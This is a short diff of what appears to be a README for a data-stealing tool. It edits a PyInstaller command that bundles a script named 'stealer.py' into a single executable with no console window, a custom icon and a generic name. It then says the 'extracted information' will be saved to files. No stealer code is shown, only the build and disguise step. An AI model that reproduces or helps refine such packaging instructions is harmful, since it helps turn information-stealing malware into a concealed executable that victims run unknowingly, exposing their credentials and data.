@@ -28,7 +28,7 @@ unzip icons.zip
 
 ```bash
 pip3 install pyinstaller
-pyinstaller -n "Test3" -F -w --distpath --icon=test.ico . .\stealer.py
+pyinstaller -n "Test3" -F -w  --icon=test.ico --distpath  . .\stealer.py
 ```
 Wait for the program to finish. The extracted information will be saved to the following files:
 
